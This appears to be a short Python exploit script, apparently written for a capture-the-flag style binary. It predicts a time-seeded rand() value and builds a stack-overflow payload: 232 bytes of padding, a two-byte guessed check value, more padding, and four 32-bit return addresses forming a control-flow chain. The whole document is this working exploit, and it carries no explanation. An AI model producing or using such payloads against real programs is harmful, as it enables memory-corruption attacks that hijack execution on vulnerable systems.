import time
epoch = time.time()
epoch = int(epoch)
epoch = epoch*0x343fd
epoch = epoch+0x269ec3
epoch = epoch >> 16
epoch = epoch & 0x7fff
epoch = "%04x"%epoch
epoch = "A"*232 + r"\x" + epoch[2:4] + r"\x" + epoch[0:2] + r"\x00\x00" + "A"*12 + r"\x73\x83\x04\x08" +r"\x83\x83\x04\x08" + r"\x9d\x83\x04\x08" + r"\x6b\x84\x04\x08"
print(epoch)
